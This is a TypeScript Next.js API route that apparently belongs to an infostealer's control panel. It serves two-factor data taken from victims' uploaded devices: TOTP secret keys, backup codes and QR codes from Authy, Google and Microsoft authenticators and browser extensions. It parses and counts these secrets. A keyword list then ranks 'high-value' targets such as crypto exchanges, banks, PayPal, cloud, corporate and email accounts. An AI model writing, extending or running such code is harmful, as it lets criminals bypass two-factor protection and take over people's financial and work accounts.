import { NextRequest, NextResponse } from "next/server"
import { executeQuery } from "@/lib/db"
import { validateRequest } from "@/lib/auth"

/**
 * GET /api/v1/authenticator/[deviceId]
 *
 * 2FA/Authenticator data extracted from apps and browsers
 * Includes TOTP secrets, backup codes, and QR codes
 */
export async function GET(
  request: NextRequest,
  { params }: { params: { deviceId: string } }
) {
  try {
    const user = await validateRequest(request)
    if (!user) {
      return NextResponse.json(
        { success: false, error: "Unauthorized" },
        { status: 401 }
      )
    }

    const { deviceId } = params

    // Get device info
    const deviceResults = await executeQuery<any>(
      `SELECT device_id, device_name, upload_date FROM devices WHERE device_id = ? LIMIT 1`,
      [deviceId]
    )

    if (!deviceResults || deviceResults.length === 0) {
      return NextResponse.json(
        { success: false, error: "Device not found" },
        { status: 404 }
      )
    }

    const device = deviceResults[0]

    // Get authenticator data
    const authenticators = await executeQuery<any>(
      `SELECT
        id,
        app_type,
        service_name,
        account_name,
        secret_key,
        backup_codes,
        qr_code_path,
        file_path,
        created_at
       FROM authenticator_data
       WHERE device_id = ?
       ORDER BY
         CASE app_type
           WHEN 'authy' THEN 0
           WHEN 'google_authenticator' THEN 1
           WHEN 'microsoft_authenticator' THEN 2
           WHEN 'browser_extension' THEN 3
           ELSE 4
         END,
         service_name,
         account_name`,
      [deviceId]
    )

    // Process backup codes (could be JSON or text)
    const processedAuthenticators = (authenticators || []).map((auth: any) => {
      let backup_codes_array = null
      if (auth.backup_codes) {
        try {
          // Try parsing as JSON first
          backup_codes_array = JSON.parse(auth.backup_codes)
        } catch {
          // Otherwise split by newlines/commas
          backup_codes_array = auth.backup_codes
            .split(/[\n,]/)
            .map((code: string) => code.trim())
            .filter((code: string) => code.length > 0)
        }
      }

      return {
        ...auth,
        has_secret: Boolean(auth.secret_key),
        has_backup_codes: Boolean(auth.backup_codes),
        has_qr_code: Boolean(auth.qr_code_path),
        backup_codes_count: backup_codes_array ? backup_codes_array.length : 0,
        backup_codes_array
      }
    })

    // Calculate statistics
    const stats = {
      total_2fa_accounts: processedAuthenticators.length,
      with_secrets: processedAuthenticators.filter((a: any) => a.has_secret).length,
      with_backup_codes: processedAuthenticators.filter((a: any) => a.has_backup_codes).length,
      with_qr_codes: processedAuthenticators.filter((a: any) => a.has_qr_code).length,
      unique_services: new Set(
        processedAuthenticators
          .map((a: any) => a.service_name)
          .filter(Boolean)
      ).size,

      // Breakdown by app type
      authy_accounts: processedAuthenticators.filter((a: any) => a.app_type === 'authy').length,
      google_auth_accounts: processedAuthenticators.filter((a: any) => a.app_type === 'google_authenticator').length,
      microsoft_auth_accounts: processedAuthenticators.filter((a: any) => a.app_type === 'microsoft_authenticator').length,
      browser_extension_accounts: processedAuthenticators.filter((a: any) => a.app_type === 'browser_extension').length,
      other_accounts: processedAuthenticators.filter((a: any) => a.app_type === 'other').length
    }

    // Group by app type
    const byAppType = groupBy(processedAuthenticators, 'app_type')

    // Group by service name
    const byService = groupBy(
      processedAuthenticators.filter((a: any) => a.service_name),
      'service_name'
    )

    // Identify high-value services (crypto, banking, cloud, corporate)
    const highValueServices = processedAuthenticators.filter((a: any) => {
      if (!a.service_name) return false
      const serviceLower = a.service_name.toLowerCase()
      return (
        // Crypto exchanges and wallets
        serviceLower.includes('binance') ||
        serviceLower.includes('coinbase') ||
        serviceLower.includes('kraken') ||
        serviceLower.includes('crypto') ||
        serviceLower.includes('metamask') ||
        serviceLower.includes('blockchain') ||
        serviceLower.includes('wallet') ||
        // Banking
        serviceLower.includes('bank') ||
        serviceLower.includes('paypal') ||
        serviceLower.includes('stripe') ||
        serviceLower.includes('venmo') ||
        // Cloud/Corporate
        serviceLower.includes('aws') ||
        serviceLower.includes('azure') ||
        serviceLower.includes('google cloud') ||
        serviceLower.includes('cloudflare') ||
        serviceLower.includes('github') ||
        serviceLower.includes('gitlab') ||
        serviceLower.includes('slack') ||
        serviceLower.includes('okta') ||
        serviceLower.includes('microsoft') ||
        serviceLower.includes('office 365') ||
        // Email
        serviceLower.includes('gmail') ||
        serviceLower.includes('outlook') ||
        serviceLower.includes('protonmail')
      )
    })

    // Categorize high-value services
    const highValueByCategory = highValueServices.reduce((acc: any, auth: any) => {
      const serviceLower = auth.service_name.toLowerCase()
      let category = 'other'

      if (serviceLower.includes('binance') || serviceLower.includes('coinbase') ||
          serviceLower.includes('kraken') || serviceLower.includes('crypto') ||
          serviceLower.includes('metamask') || serviceLower.includes('blockchain') ||
          serviceLower.includes('wallet')) {
        category = 'crypto'
      } else if (serviceLower.includes('bank') || serviceLower.includes('paypal') ||
                 serviceLower.includes('stripe') || serviceLower.includes('venmo')) {
        category = 'banking'
      } else if (serviceLower.includes('aws') || serviceLower.includes('azure') ||
                 serviceLower.includes('google cloud') || serviceLower.includes('cloudflare') ||
                 serviceLower.includes('github') || serviceLower.includes('gitlab') ||
                 serviceLower.includes('slack') || serviceLower.includes('okta') ||
                 serviceLower.includes('microsoft') || serviceLower.includes('office 365')) {
        category = 'corporate'
      } else if (serviceLower.includes('gmail') || serviceLower.includes('outlook') ||
                 serviceLower.includes('protonmail')) {
        category = 'email'
      }

      if (!acc[category]) {
        acc[category] = []
      }
      acc[category].push(auth)
      return acc
    }, {})

    return NextResponse.json({
      success: true,
      device_id: deviceId,
      device_name: device.device_name,
      upload_date: device.upload_date,
      stats,
      authenticators: {
        all: processedAuthenticators,
        by_app_type: byAppType,
        by_service: byService,
        high_value: {
          all: highValueServices,
          by_category: highValueByCategory,
          count: highValueServices.length
        }
      }
    })

  } catch (error: any) {
    console.error("Error fetching authenticator data:", error)
    return NextResponse.json(
      {
        success: false,
        error: "Failed to fetch authenticator data",
        details: error.message
      },
      { status: 500 }
    )
  }
}

/**
 * Group array by key
 */
function groupBy(array: any[], key: string): Record<string, any[]> {
  return array.reduce((result, item) => {
    const groupKey = item[key] || 'unknown'
    if (!result[groupKey]) {
      result[groupKey] = []
    }
    result[groupKey].push(item)
    return result
  }, {} as Record<string, any[]>)
}
